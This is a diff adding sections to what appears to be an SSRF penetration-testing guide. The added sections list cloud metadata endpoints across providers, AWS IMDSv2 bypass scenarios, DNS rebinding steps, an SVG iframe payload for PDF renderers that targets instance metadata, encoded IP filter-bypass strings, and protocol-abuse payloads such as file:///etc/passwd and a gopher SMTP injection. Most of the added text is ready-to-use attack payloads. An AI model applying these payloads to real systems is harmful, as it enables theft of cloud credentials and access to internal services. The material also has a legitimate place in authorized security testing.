@@ -339,3 +339,88 @@ Even if SSRF fails, document:
 3. **Webhook.site rate limits**: Free tier allows ~500 requests. For high-volume testing, self-host with `python3 -m http.server` + ngrok.
 
 4. **Path traversal + SSRF combo**: Even when `/onboarding/..;/actuator` bypasses path routing, a secondary ACL (IP whitelist, IAP, etc.) may still block. Document the traversal as a finding even if the final target is blocked — it proves the ingress ACL is bypassable.
+
+---
+
+## Cloud Metadata Endpoints (SSRF Targets)
+
+| Provider | URL | Notes |
+|----------|-----|-------|
+| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | No headers needed |
+| AWS IMDSv2 | `PUT /latest/api/token` → `GET` with token header | Needs PUT + custom header |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` | Requires `Metadata-Flavor: Google` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Requires `Metadata: true` |
+| Azure alt | `http://168.63.129.16/metadata/instance` | Alternative IP |
+| Alibaba | `http://100.100.100.200/latest/meta-data/` | No special headers |
+| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | — |
+| Oracle Cloud | `http://169.254.169.254/opc/v1/instance/` | — |
+| ECS Task | `http://169.254.170.2/v2/credentials/` | Container metadata |
+| OpenStack | `http://169.254.169.254/openstack/latest/meta_data.json` | — |
+
+### AWS IMDSv2 Bypass Scenarios
+
+IMDSv2 requires a PUT to get a token first. Exploit when:
+1. App supports custom HTTP methods in SSRF parameter (`&method=PUT`)
+2. Proxy forwards `X-HTTP-Method-Override: PUT`
+3. HTTP parameter pollution mixes GET with PUT semantics
+4. Webhook handlers that intentionally support PUT
+
+## DNS Rebinding
+
+Bypass IP validation by changing DNS mid-connection:
+1. Set up DNS server returning `169.254.169.254` after initial valid IP
+2. App validates hostname → resolves to allowed IP
+3. Actual connection resolves to internal IP (TTL=0 rebind)
+
+Tools: `rebind.network`, `rbndr.us`, custom DNS server with alternating A records.
+
+## PDF/SVG SSRF
+
+When SSRF exists in PDF generation (wkhtmltopdf, Puppeteer, WeasyPrint):
+
+```xml
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="500">
+  <foreignObject width="800" height="500">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+    </body>
+  </foreignObject>
+</svg>
+```
+
+## Additional IP Bypass Representations
+
+```
+# Decimal
+http://2130706433        (= 127.0.0.1)
+
+# Octal
+http://0177.0.0.1        (= 127.0.0.1)
+http://0330.072.0326.0343
+
+# IPv6 mapped
+http://[::ffff:127.0.0.1]
+http://[::ffff:7f00:1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+# Zero shorthand
+http://0/
+http://127.1
+http://127.0.1
+
+# URL-encoded IP
+http://%31%32%37%2e%30%2e%30%2e%31
+
+# Enclosed alphanumerics (Unicode)
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+```
+
+## Protocol Abuse for SSRF
+
+```
+file:///etc/passwd
+dict://localhost:6379/info
+gopher://localhost:25/xHELO%0d%0aMAIL+FROM...
+tftp://localhost:69/
+ldap://localhost:389/
+```
